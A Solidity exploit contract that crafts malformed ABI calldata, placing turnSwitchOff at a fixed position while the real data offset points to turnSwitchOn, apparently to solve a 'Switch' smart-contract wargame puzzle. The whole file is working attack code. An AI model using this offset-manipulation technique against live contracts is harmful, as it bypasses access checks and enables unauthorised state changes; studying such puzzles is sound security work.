// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISwitch {
    function flipSwitch(bytes memory _data) external;
}

contract SwitchExploitV2 {
    function exploit(address target) external {
        // We need to craft calldata where:
        // - Position 68 contains turnSwitchOff selector
        // - The actual _data parameter contains turnSwitchOn selector
        
        bytes memory data = hex"30c13ade" // flipSwitch(bytes) selector
                           hex"0000000000000000000000000000000000000000000000000000000000000060" // offset to data (96)
                           hex"0000000000000000000000000000000000000000000000000000000000000000" // padding
                           hex"20606e1500000000000000000000000000000000000000000000000000000000" // turnSwitchOff() at pos 68
                           hex"0000000000000000000000000000000000000000000000000000000000000004" // length of data
                           hex"76227e12"; // turnSwitchOn() selector
        
        (bool success,) = target.call(data);
        require(success, "Exploit failed");
    }
    
    // Helper function to verify selectors
    function getSelectors() external pure returns (bytes4 flipSwitch, bytes4 turnOff, bytes4 turnOn) {
        flipSwitch = bytes4(keccak256("flipSwitch(bytes)"));
        turnOff = bytes4(keccak256("turnSwitchOff()"));
        turnOn = bytes4(keccak256("turnSwitchOn()"));
    }
}